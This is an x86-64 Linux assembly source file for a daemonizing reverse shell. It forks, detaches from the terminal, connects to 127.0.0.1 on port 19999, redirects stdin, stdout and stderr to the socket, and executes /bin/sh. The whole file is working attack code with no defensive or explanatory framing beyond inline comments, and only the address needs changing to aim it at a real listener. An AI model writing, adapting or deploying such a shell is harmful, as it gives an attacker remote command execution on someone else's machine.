; Open the /bin/sh and redirect stdin/stdout(err) to a TCP connection

section .text
global _start

memset_2zero_func:
    xor al, al
    mov rcx, rdx
    rep stosb
    ret

_start:
    mov rax, 57                         ; Fork syscall number
    syscall

    cmp rax, 0                          ; if (pid == 0)
    je child                            
    jmp exit

child:
    mov rax, 112
    syscall

    xor rax, rax
    push rax
    mov byte [rsp], 0x2f                ; '/' string
    mov rdi, rsp
    
    mov rax, 80                         ; chdir("/")
    syscall

    cmp rax, -1                         ; check for errors
    jl exit

    mov rax, 95                         ; umask(0)
    xor rdi, rdi
    syscall

    mov rax, 3                          ; close(STDIN_FILENO)
    mov rdi, 0
    syscall

    mov rax, 3                          ; close(STDOUT_FILENO)
    mov rdi, 1
    syscall

    mov rax, 3                          ; close(STDERR_FILENO)
    mov rdi, 2
    syscall

    xor rdx, rdx
    mov dx, 0x006c
    push rdx
    mov rax, 0x6c756e2f7665642f
    push rax

    mov rax, 2                          ; open("/dev/null", O_RDWR) (expands to 02)
    mov rdi, rsp                        ; '/dev/null' string
    mov rsi, 0x2                        ; O_RDWR (expands to 02)
    xor rdx, rdx
    syscall
    mov rbx, rax

    mov rax, 32                         ; dup(1)
    mov rdi, 0
    syscall

    mov rax, 32                         ; dup(2)
    mov rdi, 0
    syscall

    mov rdi, rsp
    mov rdx, 16                         ; sockaddr_in size
    call memset_2zero_func              ; null the sockaddr_in

    mov word [rsp], 2
    mov word [rsp + 2], 0x1F4E          ; port = 19999
    mov dword [rsp + 4], 0x0100007f     ; ip = 127.0.0.1

    mov rax, 41                         ; socket syscall
    mov rdi, 2                          ; AF_INET
    mov rsi, 1                          ; sockstream (tcp)
    xor rdx, rdx
    syscall
    
    mov r12, rax                        ; r12 <-- sockfd

    cmp r12, 0                          ; check for errors
    jl exit

    mov rax, 42                         ; connect syscall
    mov rdi, r12                        ; sockfd
    mov rsi, rsp                        ; sockaddr_in
    mov rdx, 16                         ; sizeof sockaddr_in
    syscall

    cmp rax, 0                          ; check for errors
    jl exit

    mov rax, 33                         ; dup2 syscall
    mov rdi, r12                        ; oldfd <-- sockfd
    xor rsi, rsi                        ; rsi <-- 0 (stdin)
    syscall

    mov rax, 33                         ; dup2 syscall
    mov rdi, r12                        ; oldfd <-- sockfd
    mov rsi, 1                          ; rsi <-- 1 (stdout)
    syscall

    mov rax, 33                         ; dup2 syscall
    mov rdi, r12                        ; oldfd <-- sockfd
    mov rsi, 2                          ; rsi <-- 2 (stderr)
    syscall

    mov rax, 3                          ; close(sockfd)
    mov rdi, r12
    syscall

    add rsp, 16                         ; free stack for sockaddr_in

    xor rax, rax                        ; rax turns to null byte

    push rax                            ; push \0 (null byte) to the stack
    mov rbx, 0x68732f6e69622f           ; '/bin/sh' string
    push rbx

    mov rdi, rsp                        ; rdi (path) receive rbx ('/bin/sh\0')

    push rax                            ; null byte (execve require {path, NULL})
    push rdi                            ; ptr to our path
    mov rsi, rsp                        ; rsi (argv) receive
    
    xor rdx, rdx
    mov rax, 59
    
    syscall

exit:                                   ; Exit
    mov rax, 60
    mov rdi, 0
    syscall
